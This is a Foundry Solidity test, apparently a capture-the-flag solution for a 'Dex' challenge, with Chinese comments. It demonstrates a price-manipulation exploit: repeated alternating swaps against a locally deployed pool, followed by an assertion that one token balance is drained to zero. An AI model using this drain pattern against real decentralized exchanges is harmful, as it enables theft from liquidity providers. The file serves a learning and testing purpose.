pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";


/** 
 * 解题思路：getSwapPrice 有漏洞，如果用户持有一种 token 大于一种 token 的余额，那么就可以将一个池子掏空
 * DeFi 中 x * y = k 公式导致的问题
 */
contract HackDexTest is Test {
    address hacker = address(1111111111111111);
    address hacker2 = address(2222222222222222);
    Dex public d;
    SwappableToken public s1;
    SwappableToken public s2;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        vm.deal(hacker2, 1 ether);
    }
    function testHackDex() public {
        vm.startPrank(hacker);
        d = new Dex();
        s1 = new SwappableToken(address(d), "S1", "S1", 10000);
        s2 = new SwappableToken(address(d), "S2", "S2", 10000);

        console.log("S1 balance");
        console.logUint(s1.balanceOf(hacker));
        console.log("S2 balance");
        console.logUint(s2.balanceOf(hacker));

        // 向 dex 中添加流动性
        d.setTokens(address(s1), address(s2));
        s1.transfer(address(d), 100);
        s2.transfer(address(d), 100);
        // 给攻击账号准备初始资金
        s1.transfer(hacker2, 10);
        s2.transfer(hacker2, 10);

        vm.stopPrank();

        // 开始交换资金并让 s1 归零
        vm.startPrank(hacker2);

        // 授权 dex 操作自己的资金
        d.approve(address(d), 10000);

        console.log("attacker S1 balance");
        console.logUint(s1.balanceOf(hacker2));
        console.log("attacker S2 balance");
        console.logUint(s2.balanceOf(hacker2));

        d.swap(address(s1), address(s2), s1.balanceOf(hacker2));
        d.swap(address(s2), address(s1), s2.balanceOf(hacker2));
        d.swap(address(s1), address(s2), s1.balanceOf(hacker2));
        d.swap(address(s2), address(s1), s2.balanceOf(hacker2));
        d.swap(address(s1), address(s2), s1.balanceOf(hacker2));

        console.log("dex S1 balance");
        console.logUint(s1.balanceOf(address(d)));
        console.log("dex S2 balance");
        console.logUint(s2.balanceOf(address(d)));
        // dex 中 s2 的数量只有 45 个，可以用 45 个 S2 换到 110 个 S1
        d.swap(address(s2), address(s1), 45);

        assert(s1.balanceOf(address(d)) == 0);

        vm.stopPrank();
    }
}